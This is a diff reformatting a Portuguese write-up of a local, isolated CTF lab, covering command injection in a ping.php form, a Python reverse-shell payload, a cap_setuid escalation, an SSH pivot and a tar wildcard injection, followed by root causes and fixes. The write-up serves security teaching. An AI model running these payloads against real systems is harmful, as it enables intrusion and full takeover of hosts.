@@ -1,5 +1,8 @@
+# Tribo Tecnologia — Writeup
 
-[Dificuldade](https://img.shields.io/badge/dificuldade-m%C3%A9dia-yellow) [Plataforma](https://img.shields.io/badge/plataforma-Linux%20\(Ubuntu\)-blue) [Categoria](https://img.shields.io/badge/categoria-Web%20%2B%20Lateral%20Movement%20%2B%20Privilege%20Escalation-informational)
+![Dificuldade](https://img.shields.io/badge/dificuldade-m%C3%A9dia-yellow)
+![Plataforma](https://img.shields.io/badge/plataforma-Linux%20(Ubuntu)-blue)
+![Categoria](https://img.shields.io/badge/categoria-Web%20%2B%20Lateral%20Movement%20%2B%20Privilege%20Escalation-informational)
 
 Writeup de um CTF local (laboratório isolado) envolvendo comprometimento de um servidor de perímetro (DMZ), escalação de privilégio local, movimentação lateral até um host interno não documentado e escalação de privilégio nesse segundo host, até a obtenção de root em ambas as máquinas.
 
@@ -7,16 +10,16 @@ Writeup de um CTF local (laboratório isolado) envolvendo comprometimento de um 
 
 ## Sumário
 
-- [Escopo e metodologia](https://claude.ai/chat/25f77048-076b-4a01-bec9-f00aae8841b1#escopo-e-metodologia)
-- [1. Reconhecimento](https://claude.ai/chat/25f77048-076b-4a01-bec9-f00aae8841b1#1-reconhecimento)
-- [2. Enumeração da aplicação (porta 8080)](https://claude.ai/chat/25f77048-076b-4a01-bec9-f00aae8841b1#2-enumera%C3%A7%C3%A3o-da-aplica%C3%A7%C3%A3o-porta-8080)
-- [3. Acesso Inicial — OS Command Injection](https://claude.ai/chat/25f77048-076b-4a01-bec9-f00aae8841b1#3-acesso-inicial--os-command-injection)
-- [4. Foothold — Shell Reversa](https://claude.ai/chat/25f77048-076b-4a01-bec9-f00aae8841b1#4-foothold--shell-reversa)
-- [5. Escalação de Privilégio — Root (web01)](https://claude.ai/chat/25f77048-076b-4a01-bec9-f00aae8841b1#5-escala%C3%A7%C3%A3o-de-privil%C3%A9gio--root-web01)
-- [6. Movimentação Lateral — web01 → app02](https://claude.ai/chat/25f77048-076b-4a01-bec9-f00aae8841b1#6-movimenta%C3%A7%C3%A3o-lateral--web01--app02)
-- [7. Escalação de Privilégio — Root (app02)](https://claude.ai/chat/25f77048-076b-4a01-bec9-f00aae8841b1#7-escala%C3%A7%C3%A3o-de-privil%C3%A9gio--root-app02)
-- [8. Flags](https://claude.ai/chat/25f77048-076b-4a01-bec9-f00aae8841b1#8-flags)
-- [Causas raiz e recomendações](https://claude.ai/chat/25f77048-076b-4a01-bec9-f00aae8841b1#causas-raiz-e-recomenda%C3%A7%C3%B5es)
+- [Escopo e metodologia](#escopo-e-metodologia)
+- [1. Reconhecimento](#1-reconhecimento)
+- [2. Enumeração da aplicação (porta 8080)](#2-enumeração-da-aplicação-porta-8080)
+- [3. Acesso Inicial — OS Command Injection](#3-acesso-inicial--os-command-injection)
+- [4. Foothold — Shell Reversa](#4-foothold--shell-reversa)
+- [5. Escalação de Privilégio — Root (web01)](#5-escalação-de-privilégio--root-web01)
+- [6. Movimentação Lateral — web01 → app02](#6-movimentação-lateral--web01--app02)
+- [7. Escalação de Privilégio — Root (app02)](#7-escalação-de-privilégio--root-app02)
+- [8. Flags](#8-flags)
+- [Causas raiz e recomendações](#causas-raiz-e-recomendações)
 
 ---
 
@@ -30,14 +33,14 @@ Writeup de um CTF local (laboratório isolado) envolvendo comprometimento de um 
 
 **Ferramentas:** Nmap, feroxbuster, Netcat, Python3, SSH.
 
-|Etapa|Técnica|
+| Etapa | Técnica |
 |---|---|
-|Reconhecimento|ARP scan + Nmap (portas e versões) + feroxbuster|
-|Acesso inicial|OS Command Injection em `ping.php`|
-|Pós-exploração|Shell reversa (Python)|
-|Escalação de privilégio (web01)|Abuso de Linux capability `cap_setuid`|
-|Movimentação lateral|Reuso de credencial + `ssh -D` até a rede interna|
-|Escalação de privilégio (app02)|`tar` wildcard injection em automação privilegiada (systemd timer)|
+| Reconhecimento | ARP scan + Nmap (portas e versões) + feroxbuster |
+| Acesso inicial | OS Command Injection em `ping.php` |
+| Pós-exploração | Shell reversa (Python) |
+| Escalação de privilégio (web01) | Abuso de Linux capability `cap_setuid` |
+| Movimentação lateral | Reuso de credencial + `ssh -D` até a rede interna |
+| Escalação de privilégio (app02) | `tar` wildcard injection em automação privilegiada (systemd timer) |
 
 ---
 
@@ -49,11 +52,9 @@ Confirmação da interface de rede do atacante e identificação do alvo via ARP
 ifconfig
 ```
 
-![[01-ifconfig.png]]
+![ifconfig do Kali mostrando eth1 na rede 192.168.56.0/24](images/01-ifconfig.png)
 
-ARP scan confirmando o host 192.168.56.10
-
-![[02-arp-scan.png]]
+![ARP scan confirmando o host 192.168.56.10](images/02-arp-scan.png)
 
 Varredura completa de portas:
 
@@ -68,7 +69,7 @@ PORT     STATE SERVICE
 8080/tcp open  http-proxy
 ```
 
-![[03-nmap-p-all.png]]
+![nmap -p- identificando as portas 22, 80 e 8080](images/03-nmap-p-all.png)
 
 Detecção de versão dos serviços:
 
@@ -82,7 +83,7 @@ nmap -sV -T5 192.168.56.10
 8080/tcp open  http-proxy Apache httpd 2.4.58 (Ubuntu)
 ```
 
-![[04-nmap-sV.png]]
+![nmap -sV mostrando OpenSSH, nginx e Apache](images/04-nmap-sV.png)
 
 **Por que a 8080, e não 80:** a porta 80 respondia com o site institucional estático da "Tribo Tecnologia", sem nada de interativo. Já a porta 8080 expunha um Apache com um "Portal de Operações" — indicação de que ali estava a superfície de ataque real, por trás de algo parecido com um proxy reverso interno.
 
@@ -96,15 +97,13 @@ Varredura de diretórios na porta 8080:
 feroxbuster -u http://192.168.56.10:8080/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt
 ```
 
-![[05-feroxbuster.png]]
+![feroxbuster encontrando o diretório /tools/ com listagem habilitada](images/05-feroxbuster.png)
 
 Encontrado o diretório `/tools/` com listagem de diretório habilitada (status 200), expondo o arquivo `ping.php` — uma ferramenta de diagnóstico de conectividade.
 
-![[06-index-tools.png]]
+![Listagem de diretório /tools/ expondo ping.php](images/06-index-tools.png)
 
-Página web do ping.php — formulário de "Verificação de conectividade"
-
-![[07-pingphp-page.png]]
+![Página web do ping.php — formulário de "Verificação de conectividade"](images/07-pingphp-page.png)
 
 ---
 
@@ -118,7 +117,7 @@ Entrada usada no campo `host`:
 192.168.56.10 & whoami
 ```
 
-![[08-command-injection-confirm.png]]
+![Confirmação da command injection — host=...&whoami retornando www-data](images/08-command-injection-confirm.png)
 
 Confirmado: o comando injetado executa como `www-data`.
 
@@ -134,13 +133,13 @@ nc -lvnp 4444
 
 Payload de shell reversa em Python (`socket` + `pty.spawn`), montado e enviado pelo mesmo campo `host`:
 
-![[09-python-payload.png]]
+![Payload de shell reversa em Python sendo inserido no campo host](images/09-python-payload.png)
 
 ```
 192.168.56.10 & python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.56.101",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);import pty;pty.spawn("/bin/bash")'
 ```
 
-![[10-reverse-shell.png]]
+![Shell reversa recebida como www-data em web01](images/10-reverse-shell.png)
 
 Estabilização da shell:
 
@@ -165,7 +164,7 @@ find / -name "config.php" -type f 2>/dev/null
 cat /var/www/vulnapp/config.php
 ```
 
-![[11-config-php.png]]
+![config.php com credencial em texto claro](images/11-config-php.png)
 
 Credencial encontrada: usuário `webapp`, senha `Trib0Web!2024`.
 
@@ -173,7 +172,7 @@ Credencial encontrada: usuário `webapp`, senha `Trib0Web!2024`.
 cat /etc/passwd
 ```
 
-![[12-etc-passwd.png]]
+![/etc/passwd revelando os usuários fiap e jdias](images/12-etc-passwd.png)
 
 Revelou os usuários `fiap` e `jdias`. A credencial encontrada foi testada contra `jdias`:
 
@@ -182,7 +181,7 @@ su - jdias
 # senha: Trib0Web!2024
 ```
 
-![[13-su-jdias.png]]
+![su - jdias confirmando o reuso de credencial](images/13-su-jdias.png)
 
 Confirmado **reuso de credencial**: a senha do banco de dados também era a senha do sistema para `jdias`.
 
@@ -194,7 +193,7 @@ Descartados SUID, `sudo -l`, diretórios/arquivos graváveis e crontab (`/etc/cr
 getcap -r / 2>/dev/null
 ```
 
-![[14-getcap-pycheck.png]]
+![getcap revelando pycheck com cap_setuid=ep](images/14-getcap-pycheck.png)
 
 `getcap -r /` revelou o vetor real: `/opt/maintenance/pycheck` com a capability `cap_setuid=ep`.
 
@@ -214,7 +213,7 @@ Confirmado acesso root completo no web01.
 
 Com root no web01, `ip a` revelou uma segunda interface (`enp0s8`) conectando o host a uma rede interna isolada: `192.168.57.0/24`.
 
-![[15-ip-a-root.png]]
+![ip a mostrando root@web01 e a interface enp0s8 na rede interna](images/15-ip-a-root.png)
 
 Ping sweep manual (sem Nmap disponível no alvo):
 
@@ -228,8 +227,9 @@ Identificado o host vivo `192.168.57.20`. Varredura de portas via `nc`:
 for p in {1..65535}; do (nc -zvw1 192.168.57.20 $p 2>&1 | grep -E "open|succeeded"); done
 ```
 
+![nc confirmando as portas 22 e 80 abertas em 192.168.57.20](images/16-nc-port-scan.png)
 
-![[16-nc-port-scan.png]]
+Confirmadas as portas 22 (SSH) e 80 (HTTP) abertas.
 
 ### Pivô via SSH -D
 
@@ -240,7 +240,7 @@ ssh -D 0.0.0.0:1080 jdias@192.168.57.20
 # senha: Trib0Web!2024
 ```
 
-![[17-ssh-D-login.png]]
+![ssh -D 0.0.0.0:1080 autenticando como jdias no app02](images/17-ssh-D-login.png)
 
 **Por que não foi necessário um túnel dedicado (Chisel, etc.):** o próprio web01 comprometido já enxergava a rede interna diretamente, então bastou rodar o cliente SSH de dentro dessa sessão — sem precisar redirecionar portas para a máquina atacante.
 
@@ -262,7 +262,7 @@ cat /etc/systemd/system/backup.service
 cat /usr/local/sbin/run_backup.sh
 ```
 
-![[18-systemd-timer-cat.png]]
+![cat do backup.timer, backup.service e run_backup.sh](images/18-systemd-timer-cat.png)
 
 - `backup.timer`: dispara a cada 2 minutos (`OnUnitActiveSec=2min`)
 - `backup.service`: roda como **root** (`User=root`), executando `run_backup.sh`
@@ -279,7 +279,7 @@ O diretório `/home/jdias/reports` era de propriedade de `jdias`:
 ls -la /home/jdias/reports
 ```
 
-![[19-ls-reports.png]]
+![ls -la /home/jdias/reports confirmando posse e permissão de escrita](images/19-ls-reports.png)
 
 **Por que isso é explorável:** o `tar` é executado com um curinga (`*`) dentro de um diretório controlado por um usuário de baixo privilégio. Quem expande esse `*` é o shell, antes do `tar` rodar — e se um dos "arquivos" no diretório tiver um nome começando com `--`, o shell ainda assim o inclui na lista de argumentos, fazendo o `tar` interpretá-lo como uma flag de linha de comando em vez de um arquivo.
 
@@ -297,7 +297,7 @@ touch -- '--checkpoint-action=exec=sh payload.sh'
 
 No próximo disparo do timer, `/tmp/rootbash` foi criado com SUID de root:
 
-![[20-rootbash.png]]
+![/tmp/rootbash criado e whoami retornando root](images/20-rootbash.png)
 
 ```bash
 /tmp/rootbash -p
@@ -315,14 +315,14 @@ cat /root/root.txt
 cat /root/root.txt
 ```
 
-![[21-root-flag.png]]
+![cat /root/root.txt mostrando a flag final](images/21-root-flag.png)
 
-|Etapa|Host|Flag|
+| Etapa | Host | Flag |
 |---|---|---|
-|Foothold|web01|`FLAG{A-foothold-7c1e9b}`|
-|Root|web01|`FLAG{A-root-91b6c4}`|
-|Usuário (user.txt)|app02|`FLAG{B-user-5d2e77}`|
-|Root final (root.txt)|app02|_flag final_|
+| Foothold | web01 | `FLAG{A-foothold-7c1e9b}` |
+| Root | web01 | `FLAG{A-root-91b6c4}` |
+| Usuário (user.txt) | app02 | `FLAG{B-user-5d2e77}` |
+| Root final (root.txt) | app02 | *flag final* |
 
 Flags capturadas com sucesso, confirmando o comprometimento total de ambos os hosts.
 
@@ -339,7 +339,6 @@ Flags capturadas com sucesso, confirmando o comprometimento total de ambos os ho
 **Impacto:** execução remota de código não autenticada, viabilizando o acesso inicial (`www-data`).
 
 **Recomendação:**
-
 - Eliminar a construção dinâmica de comandos de shell a partir de entrada do usuário.
 - Validar rigorosamente o formato esperado (ex.: regex de IPv4) antes de qualquer processamento.
 - Usar chamadas de sistema parametrizadas (`exec` com array de argumentos), nunca concatenação de string.
@@ -353,7 +352,6 @@ Flags capturadas com sucesso, confirmando o comprometimento total de ambos os ho
 **Impacto:** escalação de privilégio local de `www-data`/`jdias` para root no web01.
 
 **Recomendação:**
-
 - Remover capabilities desnecessárias de binários, especialmente `cap_setuid`.
 - Evitar manter interpretadores de propósito geral com privilégios elevados acessíveis a serviços web.
 - Auditar periodicamente o sistema com `getcap -r /`.
@@ -367,7 +365,6 @@ Flags capturadas com sucesso, confirmando o comprometimento total de ambos os ho
 **Impacto:** vazamento de credencial que, por reuso, viabilizou tanto a escalação local (`su - jdias`) quanto a movimentação lateral até o app02.
 
 **Recomendação:**
-
 - Nunca armazenar credenciais em texto claro em código-fonte ou arquivos de configuração versionados; usar cofres de segredos (vault) ou variáveis de ambiente protegidas.
 - Impor política de não reuso de senhas entre sistemas e contas de serviço distintas.
 
@@ -380,7 +377,6 @@ Flags capturadas com sucesso, confirmando o comprometimento total de ambos os ho
 **Impacto:** um único host de perímetro comprometido deu acesso de rede total a um sistema interno que nunca deveria estar exposto.
 
 **Recomendação:**
-
 - Reforçar a segmentação de rede entre DMZ e rede interna, com firewall e regras explícitas de menor privilégio.
 - Monitorar/alertar sobre conexões não previstas partindo de hosts de perímetro para redes internas.
 
@@ -393,7 +389,6 @@ Flags capturadas com sucesso, confirmando o comprometimento total de ambos os ho
 **Impacto:** escalação de privilégio local de `jdias` para root no app02.
 
 **Recomendação:**
-
 - Evitar o uso de curingas (`*`) em comandos `tar`/`chmod`/`chown` executados por rotinas privilegiadas sobre diretórios graváveis por usuários não privilegiados.
 - Usar caminhos explícitos ou a flag `--` para encerrar o parsing de opções.
 - Rodar rotinas de automação com o menor privilégio necessário, nunca como root por padrão.
